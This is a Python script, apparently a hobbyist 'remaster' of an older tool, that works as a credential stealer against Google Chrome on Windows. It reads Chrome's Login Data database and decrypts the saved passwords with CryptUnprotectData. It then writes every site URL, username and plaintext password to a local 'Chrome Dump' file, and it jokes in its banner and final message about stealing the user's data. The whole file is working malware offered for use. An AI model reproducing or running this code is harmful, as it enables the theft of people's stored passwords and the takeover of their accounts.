import os
from os import getenv
import sqlite3
import win32crypt

print("""
Stealing Ya' Data since 2019


                       El Getaway Car
       	    	    _____________________
                   /	        |	  \ .
                  /             |          \ .
                 / _____________|__________ \ .
    ____________|      \        |    \       |_____________
    |       ____|____           |          ________       |
    |      /         \          |         /        \      |
    |_____/    | |    \ ________________ /   |  |   \_____|
          \    | |    /                  \   |  |   /
           \_________/                    \________/

Remastered by TheStandardPancake, credit to bluedangerforyou for writing the original code

""")

#setting up the file to dump info
usb = os.path.abspath(__file__)
os.makedirs(os.path.join(usb + "Chrome Dump"))
path = os.path.join(usb + "Chrome Dump")

#labels for easy use in the file
username1 = "Username: "
siteId = "Site ID: "
password_field = "Password: "

#The magic happens
f = open(os.path.join(path,"passwordsusers.txt"), "w")
conn = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Login Data")
conn3 = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/History")
conn1 = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Web Data")
conn4 = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Web Data")
cursor3 = conn3.cursor()
cursor1 = conn1.cursor()
cursor4 = conn4.cursor()
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
	if password:
		f.writelines(siteId + str(result[0]) + '\n' + username1 + str(result[1]) + '\n' + password_field + str(password) + '\n' + '--------------------------------' + '\n')
f.close()
print("Congrats, your data is now stolen, LOL!")

input("Press Enter to close the tool")  #this is probably the coolest piece of code here, such a minor way to decrease lines of code, haha and here I am ruining that by disecting it up
